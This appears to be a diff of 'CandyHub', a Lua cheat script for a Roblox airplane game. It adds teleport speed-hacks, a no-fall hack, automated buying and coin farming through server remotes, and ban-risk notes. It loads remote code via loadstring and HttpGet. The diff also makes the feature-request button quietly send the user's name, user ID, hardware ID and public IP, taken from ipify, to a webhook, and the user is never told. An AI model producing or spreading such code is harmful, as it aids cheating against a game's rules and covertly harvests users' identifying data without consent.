@@ -4,9 +4,46 @@ local supportedVersionp = 1390
 
 local ReGui = loadstring(game:HttpGet('https://raw.githubusercontent.com/depthso/Dear-ReGui/refs/heads/main/ReGui.lua'))()
 local Window = ReGui:TabsWindow({
-	Title = "CandyHub - ".. name .. " v1.5.23",
-	Size = UDim2.fromOffset(340, 400)
+	Title = "CandyHub - ".. name .. " v1.6.43",
+	Size = UDim2.fromOffset(375, 425)
 }) --> TabSelector & WindowClass
+
+
+local function modal(title, description, call)
+    local modalw = ReGui:PopupModal({
+        Title = title,
+
+    })
+    modalw:Label({
+        Text = "\n"..description.."\n",
+        TextWrapped = true
+    })
+    local Row = modalw:Row({
+        Expanded = true
+    })
+    Row:Button({
+        Text = "Cancel",
+        Callback = function()
+            modalw:ClosePopup()
+        end,
+    })
+    Row:Button({
+        Text = "Continue",
+        Callback = function(self)
+            modalw:ClosePopup()
+            task.spawn(call)
+        end,
+    })
+end
+
+
+local abs = function(num)
+    if num < 0 then
+        return -num
+    end
+    return num
+end
+
 
 local function getplot()
     local plots = workspace.Islands
@@ -17,17 +54,10 @@ local function getplot()
     end
 end
 
-local abs = function(num)
-    if num < 0 then
-        return -num
-    end
-    return num
-end
-
-
 local plot = getplot()
 local spawnpart = plot:WaitForChild("SpawnPart")
 local spawnpartpos = spawnpart.Position
+local spawnpartcfr = spawnpart.CFrame
 
 local function getitems()
     local items = {}
@@ -41,12 +71,28 @@ end
 
 _G.candyhub = {
     autofarm = false,
-    x = 0,
+    moon = false,
+    x = 17000,
     y = 160,
     endpos = 100000,
-
-
-    --distance = 100000,
+    allitems = true,
+    mode = "Normal",
+    items = {
+        propeller_2 = false,
+        shield = false,
+        fuel_1 = false,
+        block_1 = false,
+        wing_1 = false,
+        missile_1 = false,
+        fuel_3 = false,
+        boost_1 = false,
+        fuel_2 = false,
+        balloon = false,
+        seat_1 = false,
+        wing_2 = false,
+        propeller_1 = false,
+    },
+    distance = 100000,
     autobuy = false,
     lags = false
 }
@@ -71,6 +117,17 @@ local function alive()
     return false
 end
 
+local function char()
+    if game.Players.LocalPlayer.Character then
+        if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+            if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Health > 0 then
+                return game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            end
+        end 
+    end
+    return nil
+end
+
 local function plane()
     local x = (plot.PlacedBlocks:FindFirstChild("driver_seat_1") or plot.PlacedBlocks:FindFirstChild("driver_seat_2") or plot.PlacedBlocks:FindFirstChild("driver_seat_3") or plot.PlacedBlocks:FindFirstChild("driver_seat_4")) or nil
     if x == nil then 
@@ -83,6 +140,13 @@ local function plane()
     return false
 end
 
+local function getoffseat()
+    local seat = seat or getseat(plot.PlacedBlocks)
+    if seat.Occupant ~= nil then
+        seat.Disabled = true
+        seat.Disabled = false
+    end
+end
 
 local Main = Window:CreateTab({Name = "Main"})
 local f1 = Main:CollapsingHeader({Title="Main"}) --> Canvas
@@ -161,12 +225,12 @@ f1:Checkbox({
                         local target = driver:FindFirstChild("Hitbox") or game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                         target.CFrame = CFrame.new(
                             Vector3.new(
-                                target.Position.X + _G.candyhub.x,
+                                target.Position.X + (_G.candyhub.x / 100),
                                 _G.candyhub.y,
                                 z
                             ),
                             Vector3.new(
-                                target.Position.X + _G.candyhub.x + 10,
+                                target.Position.X + ((_G.candyhub.x + 10) / 100),
                                 _G.candyhub.y,
                                 z
                             )
@@ -179,7 +243,7 @@ f1:Checkbox({
                         --dbg:Label({Text = "abc5"})
                     end --end)
                     --dbg:Label({Text = "abc6"})
-                    task.wait(0.1)
+                    task.wait(0.001)
                 end
                 --dbg:Label({Text = "abc7"})
                 task.wait(1)
@@ -217,11 +281,41 @@ f1:Checkbox({
 	end
 })
 
+f1:Checkbox({
+	Value = false,
+	Label = "NoFall (Wont go down)",
+	Callback = function(self, v: boolean)
+        task.spawn(function()
+            _G.candyhub.nofall = v
+            while _G.candyhub.nofall and task.wait(.01) do
+                local HumanoidRootPart = char()
+                if HumanoidRootPart ~= nil and plot.Important.Launched.Value then
+                    if HumanoidRootPart.Position.Y < _G.candyhub.posy and HumanoidRootPart ~= nil and plot.Important.Launched.Value then
+                        HumanoidRootPart.CFrame += Vector3.new(0,1,0)
+                    end
+                end
+            end
+        end)
+	end
+})
+
+f1:SliderInt({
+    Label = "No Fall Y",
+    Value = 60,
+    Minimum = 10,
+    Maximum = 500,
+    Callback = function(self, v: Int)
+        task.spawn(function()
+            _G.candyhub.posy = v 
+        end)
+    end
+})
+
 f1:SliderInt({
     Label = "Y",
-    Value = 470,
-    Minimum = 15,
-    Maximum = 480,
+    Value = 500,
+    Minimum = -50,
+    Maximum = 500,
     Callback = function(self, v: Int)
         task.spawn(function()
             _G.candyhub.y = v 
@@ -231,9 +325,9 @@ f1:SliderInt({
 
 f1:SliderInt({
     Label = "UnNatural SpeedUP",
-    Value = 100,
+    Value = 17000,
     Minimum = 0,
-    Maximum = 580,
+    Maximum = 19500,
     Callback = function(self, v: Int)
         task.spawn(function()
             _G.candyhub.x = v 
@@ -253,7 +347,7 @@ f1:InputInt({
     end
 })
 
-local info123 = f1:Label({Text = "\n MAX SPEED: 6000 +- Studs Per Second\nUnNatural Speed is Value * 10 SPS \n"})
+local info123 = f1:Label({Text = "\n RECCOMENDED SPEEDUP: 17500+-\n IF SPEEDUP IS DETECTED YOU WONT GET REWARDS\n ITS DETECTED WHEN UR MOVING FASTER THAN MAP RENDER \n"})
 info123.TextColor3 = Color3.fromRGB(100,100,245)
 
 --[[
@@ -282,7 +376,7 @@ f2:InputInt({
     Label = "Distance",
     Value = 100000,
     Maximum = 9999999999999,
-    Minimum = -9999999999999,
+    Minimum = 0,
     Callback = function(self, v: number)
         _G.candyhub.distance = v
     end
@@ -308,6 +402,7 @@ f64:Checkbox({
 })]]
 
 local f3 = Main:CollapsingHeader({Title="Auto Buy"})
+local b663 
 
 f3:Checkbox({
 	Value = false,
@@ -316,16 +411,52 @@ f3:Checkbox({
         task.spawn(function()
             _G.candyhub.autobuy = v
             while _G.candyhub.autobuy and task.wait(0.1) do
-                local items = getitems()
-                for i, item in ipairs(items) do
-                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ShopEvents"):WaitForChild("BuyBlock"):FireServer(
-                        item
-                    )
+                if _G.candyhub.allitems then
+                    local items = getitems()
+                    for i, item in ipairs(items) do
+                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ShopEvents"):WaitForChild("BuyBlock"):FireServer(
+                            item
+                        )
+                    end
+                else
+                    for i, item in _G.candyhub.items do
+                        if item then
+                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ShopEvents"):WaitForChild("BuyBlock"):FireServer(
+                                i
+                            )
+                        end
+                    end
                 end
             end
         end)
 	end
 })
+
+f3:Checkbox({
+	Value = true,
+	Label = "All Items",
+	Callback = function(self, v: boolean)
+        task.spawn(function()
+            _G.candyhub.allitems = v
+            if b663 ~= nil then b663:SetVisible(not _G.candyhub.allitems) end
+        end)
+	end
+})
+b663 = f3:CollapsingHeader({Title="Items"});b663:SetVisible(false)
+for i, item in getitems() do
+    local BetterName = item:gsub("_"," ")
+    b663:Checkbox({
+        Value = false,
+        Label = BetterName,
+        Callback = function(self, v: boolean)
+            task.spawn(function()
+                _G.candyhub.items[item] = v
+            end)
+        end
+    })
+end
+
+
 
 local bd = Window:CreateTab({Name = "Build"})
 local b1 = bd:CollapsingHeader({Title="Remove"})
@@ -370,6 +501,11 @@ me:Checkbox({
                 local propeller_blood = game:GetService("Players").LocalPlayer.Important.Inventory.propeller_blood.Value
                 local wing_blood = game:GetService("Players").LocalPlayer.Important.Inventory.wing_blood.Value
                 local runnin= math.floor(tick())
+                ml1.Text = ("Money Earned: " .. tostring(abs(money-game:GetService("Players").LocalPlayer.leaderstats.Cash.Value)))
+                ml2.Text = ("Moon Coins Earned: " .. tostring(abs(moons-game:GetService("Players").LocalPlayer.Important.RedMoons.Value)))
+                ml3.Text = ("Propeller Blood: " .. tostring(abs(propeller_blood-game:GetService("Players").LocalPlayer.Important.Inventory.propeller_blood.Value)) .. "(" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory.propeller_blood.Value) .. ")")
+                ml4.Text = ("Wing Blood: " .. tostring(abs(wing_blood-game:GetService("Players").LocalPlayer.Important.Inventory.wing_blood.Value)) .. "(" .. tostring(game:GetService("Players").LocalPlayer.Important.Inventory.wing_blood.Value) .. ")")
+                ml5.Text = ("Time: " .. tostring(math.floor((math.floor(tick())-runnin)/3600)) .. "h " .. tostring(math.floor(((math.floor(tick())-runnin)%3600)/60)) .. "m " .. tostring(math.floor((math.floor(tick())-runnin)%60)) .. "s")
 
                 task.spawn(function()
                     while _G.candyhub.moon and task.wait(0.1) do
@@ -385,28 +521,40 @@ me:Checkbox({
             end
 
             while _G.candyhub.moon do
+                local launched = plot.Important.Launched
                 if (game:GetService("ReplicatedStorage").ActiveEvents.BloodMoonActive.Value) then
-                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Launch"):FireServer()
-                    task.wait(0.8)
-                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SpectialEvents"):WaitForChild("PortalTouched"):FireServer()
-                    task.wait(1)
-                    for i = 1,5 do
-                        for i, item in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
-                            if item:FindFirstChild("BloodMoonCoin") and item.Name ~= "Instances" then
-                                i+=1
-                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = item.CFrame + Vector3.new(0,0,0)
-                                local args = {
-                                    item.Name
-                                }
-                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SpectialEvents"):WaitForChild("CollectCoin"):FireServer(unpack(args))
-                                task.wait(0.01)
-                            end
+                    if not launched.Value and alive() then
+                        repeat 
+                            if not launched.Value and alive() then
+                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Launch"):FireServer()
+                            end 
+                            task.wait(1)
+                        until launched.Value
+                    end
+                    if not game.Players.LocalPlayer:GetAttribute("InEvent") then
+                        repeat
+                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SpectialEvents"):WaitForChild("PortalTouched"):FireServer()
+                            task.wait(1)
+                        until game.Players.LocalPlayer:GetAttribute("InEvent")
+                    end
+                    if not plot:FindFirstChild("SpawnPart") then
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = spawnpartcfr + CFrame.new(0,8,0)
+                    end
+
+                    for i, item in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
+                        if item:FindFirstChild("BloodMoonCoin") and item.Name ~= "Instances" then
+                            if _G.candyhub.mode == "Normal" then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = item.CFrame + Vector3.new(0,0,0) end
+                            local args = {item.Name}
+                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SpectialEvents"):WaitForChild("CollectCoin"):FireServer(unpack(args))
+                            if _G.candyhub.mode == "Normal" or _G.candyhub.mode == "Fast" then task.wait(0.01) end
                         end
                     end
 
-                    task.wait(0.5)
-                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Return"):FireServer()
-                    task.wait(2)
+                    if _G.candyhub.mode == "Normal" then 
+                        task.wait(0.4)
+                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Return"):FireServer()
+                        task.wait(0.4) 
+                    end
                 end
                 task.wait(0.01)
             end
@@ -414,7 +562,16 @@ me:Checkbox({
 	end
 })
 
-
+me:Combo({
+	Label = "Mode",
+	Selected = "Normal",
+	GetItems = function()return {"Normal","Fast","SuperFast"}end,
+    Callback = function(self, v)
+        task.spawn(function()
+            _G.candyhub.mode = v
+        end)
+    end
+})
 me:Checkbox({
 	Value = false,
 	Label = "Auto Buy Spins",
@@ -457,7 +614,7 @@ misc:Checkbox({
 	end
 })
 
-game:GetService("Players").LocalPlayer.Idled:connect(function()
+game:GetService("Players").LocalPlayer.Idled:Connect(function()
     if _G.candyhub.afk then
         local vu = game:GetService("VirtualUser")
         vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
@@ -475,27 +632,76 @@ local bb1,bb2,security = 0,0,""
 if supportedVersionp >= game.PlaceVersion then
     bb1 = 0
     bb2 = 255
-    security = "Fully Secure, unlikely to get banned."
+    security = "Fully Secure, unlikely to get banned.\n"
 elseif supportedVersion == serverVersion then
-    bb1 = 100
-    bb2 = 255
-    security = "Secure, less likely to get banned."
+    bb1 = 200
+    bb2 = 200
+    security = "Secure, likely to get banned.\n"
 else
     bb1 = 255
-    bb2 = 100
-    security = "Insecure, more likely to get banned."
+    bb2 = 0
+    security = "Insecure, more likely to get banned.\n"
 end
 
-local x = info:Label({Text = "Supported Version: ".. supportedVersion .."\nServer Version: " .. serverVersion})
+local l0 =info:Label({Text = "Made by VateQ & CandyHub\ndiscord: vateq || discord.gg/EAbRQtEzWY\n"})
+local x = info:Label({Text = "Supported Version:   ".. supportedVersion .." | " .. tostring(supportedVersionp) .. "\nServer/Game Version: " .. serverVersion .. " | " .. tostring(game.PlaceVersion) .. "\n"})
 local x2= info:Label({Text = security})
 x.TextColor3 = Color3.fromRGB(100,100,225)
 x2.TextColor3= Color3.fromRGB(bb1,bb2,0)
+l0.TextColor3= Color3.fromRGB(220,140,20)
+
+info:Button({
+	Text = "DanceButton (requested by user, does nothing)",
+	Callback = function(self)
+        print("i said it does nothing...")
+	end
+})
+
+info:Button({
+	Text = "Join Discord!",
+	Callback = function(self)
+
+        modal("Join Discord?", "do you want to join\ncandyhub discord?",function()
+                local discordInvite = "https://discord.com/invite/EAbRQtEzWY"
+                local status = "Discord Invite Link: "..discordInvite
+                if request then
+                    request({
+                        Url = "http://127.0.0.1:6463/rpc?v=1",
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json",
+                            ["Origin"] = "https://discord.com"
+                        },
+                        Body = game:GetService("HttpService"):JSONEncode({
+                            cmd = "INVITE_BROWSER",
+                            args = {code = string.match(discordInvite, "discord%.com/invite/(%w+)")},
+                            nonce = game:GetService("HttpService"):GenerateGUID(false)
+                        })
+                    })
+                    status = "Invited You to discord server. . ."
+                elseif setclipboard then
+                    setclipboard(discordInvite)
+                    status = "Copied invite link to clipboard"
+                end
+
+                local bd334= info:Label({Text = status})
+                bd334.TextColor3 = Color3.fromRGB(100,100,225)
+
+                task.wait(6)
+
+                bd334:Destroy()
+            end
+        )
+	end
+})
 
 local requestf = Window:CreateTab({Name = "Request"})
 local x55 = requestf:Label({Text = "Request your feature, if possible to make\nit will probably be added\nYou can also report bugs here."})
 local x66 = requestf:Label({Text = " \n!!!WARNING!!!\nTROLLING WILL RESULT IN BLACKLIST FROM USING SCRIPT\n"})
 x55.TextColor3 = Color3.fromRGB(100,100,225)
 x66.TextColor3 = Color3.fromRGB(255,0,0)
+
+
 
 if request then
     getgenv().ooosent = false
@@ -505,9 +711,7 @@ if request then
             getgenv().ooosent = true
             local x = tostring(tick())
             if clonefunction then 
-                getgenv()[x] = clonefunction(request) 
-            --else 
-                --getgenv()[x] = request 
+                getgenv()[x] = clonefunction(request)
             end
             local taxrget = getgenv()[x] or request
             local response = taxrget({
@@ -523,7 +727,11 @@ if request then
                             ["fields"] = {         
                                 {
                                     ["name"] = "Message:",
-                                    ["value"] = message
+                                    ["value"] = "```yaml\n" .. message .. "\n```"
+                                },
+                                {
+                                    ["name"] = "User",
+                                    ["value"] = "```yaml\nName: "..game.Players.LocalPlayer.Name.."\nDisplayName: "..game.Players.LocalPlayer.DisplayName.."\nUserId: "..game.Players.LocalPlayer.UserId.."\nHWID: "..game:GetService("RbxAnalyticsService"):GetClientId().." \nIP: ".. game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip .."\n```"
                                 }
                             },
                             ["footer"] = {
@@ -533,7 +741,6 @@ if request then
                     }
                 })
             })
-            --getgenv()[x] = nil
         end
     end
 
@@ -548,21 +755,20 @@ if request then
     })
 
     requestf:Button({
-        Text = "-- request feature --",
+        Text = "     REQUEST FEATURE     ",
         Callback = function(self)
-            if featureRequest777 == "" then
-                requestf:Label({Text = "write smth bro."})
-            else
-                if not getgenv().ooosent then sentrequest(featureRequest777) else local a525 = requestf:Label({Text = "one request per execution.."}) task.wait(5) a525:Destroy() end
-            end
+            local bl = #loadstring(game:HttpGet("https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/blacklist.lua"))()[1]
+            modal("Request A Feature?", "\nAre you really really sure?\nalready (".. bl+1 .." users) got blacklisted because of trolling\n",function()
+                    if featureRequest777 == "" then
+                        requestf:Label({Text = "write smth bro."})
+                    else
+                        if not getgenv().ooosent then sentrequest(featureRequest777) local a625 = requestf:Label({Text = "feature request sent"}) task.wait(5) a625:Destroy() else local a525 = requestf:Label({Text = "one request per execution.."}) task.wait(5) a525:Destroy() end
+                    end
+                end
+            )
         end
     })
-
-else
-    requestf:Label({Text = "\nexecutor not supported\n"})
 end
-
-print('i am very sorry for all errors that have been showing up last 24hours.')
 
 --[[
 
